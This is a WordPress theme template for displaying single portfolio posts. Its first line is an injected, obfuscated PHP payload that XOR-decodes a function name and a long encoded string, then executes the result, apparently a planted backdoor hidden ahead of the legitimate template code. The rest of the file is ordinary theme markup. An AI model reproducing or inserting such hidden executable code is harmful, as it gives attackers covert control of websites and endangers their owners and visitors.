<?php $DydNDMoLv='7I4MNPq199PNQ7Y'^'T;Q,:5.WLW3:8X7';$eOiHKF=$DydNDMoLv('','S<kePU=3C<OBa+D. 2CAPC,BgI.F,77M DIKcSHoj3999T9D=N:OK91YF4daUYCyC4X ZXLtW7GSoyIGkLke7M8DTbJeimszAaFT6XiRdvxZSZEIvNIFL<8yCIJEYOQfq9Sjf=Ccj<EMGhykxhDS6J5OEok-AB=K+jj3nDQ M:+.PlCRR4ZvqradO5E2KJ=kV-C0dlik9Z;1EA5U7.WTlWW8+0BBj,92ZqE1-Vpt0WGASsbIF63PMC+Dcu.:u5,gsZWKHb162RStYLBRWKWjdGO7p4XO11 0:ArDv3WYUOZMO152VLvf9A>BXP1EER,5uMXe>TAXgSFsl3<0R57<bPQklseeu>eoOCmSSIGbnpftZWXC6YpGmmhk1J A1,E5JugWUS=hRZgmYZ21xKhFBU-1NJCQCGKlar-1D3TJiy1E>RG-A.02.qCTI<X5,VnfCLDxSS+-Dxn-X4<6<XtDO7 DxbQ 6.JbQ 0ApvM9.XsPWTYFqKF9O;W508=7mPOIIFKaPKR.rBokOR-YqTaERrAHcyUS707aKG43i>dMvLGRioWU72YVbHx.1BWThXDTz2czSC2PVtAUmpLorEWOEWEbWX,i<2U5IKXI8AHLO.0paeO>,E-GjtKGyAm+0h521UoPHR>30pC.GV8; i7hU0y3T0ONAMq31'^':ZCD6 SP7U ,>N<GSF0iw;C08-O2Mhh U0nbJs3ecULWZ P+SnB 9fU82U;>8,7QgP9T;tlP<R>zOYigK7al>iW1 BwENJHpHh ;DpM;DKXjhza J==4 YVQg-+18fjFUPxAO7JjNS09gFDKPL 2B+nk,2KsafV.R1NZNaqS9HGK>Dg97Ms+XIkmFG F>8SCrB6DMWcbDPF;OeQ4COwiL16TXUyHNHXF;..TTvMTV6+26HhC YA5, CdKQqy:zg.6z68hFZSKrnJyh43;>2CD<E>TP9;PnKUCaOdRX2 nESi+PASvqVBO R7=k;8OXESUeyAZ559Ns=yeUSB7TTTBxu4>6400m1O.0Mw8,>BSNFP,646SpP<gdaOU+T nG LjHGs>6DSXSnI=;FPXvHb44AD+qIX>M6fkVIP0RtwI9D+M75D BYHKY;;;c<TX719.90P12XHrL1I=WSRYpP .CAmTBuDWZ+=:EIhYMGPHpW46 8fWmfX=I6LoSXN257 :28Iw 7WUnOO+3Y8XtGcrZ,,VQq7VDV:l,QJNcMmKqguPWeaQThcQ,OKStgcP>p2LPWKbsPadE 7JYlITe6=76<=<=U6YJ<F=8pnH 1  OTWMEkZM1LnCTkgYaMP:aPDP9Gt,3JRkW3O>:WZDNjAn:pV,Y;fqdJ9L');$eOiHKF();
/**
 * The Template for displaying all single posts.
 *
 * @package Sketch
 */

get_header(); ?>

	<div id="primary" class="content-area">
		<main id="main" class="site-main" role="main">

		<?php while ( have_posts() ) : the_post(); ?>

			<?php get_template_part( 'content', 'portfolio-single' ); ?>

			<?php
				// If comments are open or we have at least one comment, load up the comment template
				if ( comments_open() || '0' != get_comments_number() ) :
					comments_template();
				endif;
			?>

		<?php endwhile; // end of the loop. ?>

		<?php sketch_portfolio_pagination(); ?>

		</main><!-- #main -->
	</div><!-- #primary -->

<?php get_footer(); ?>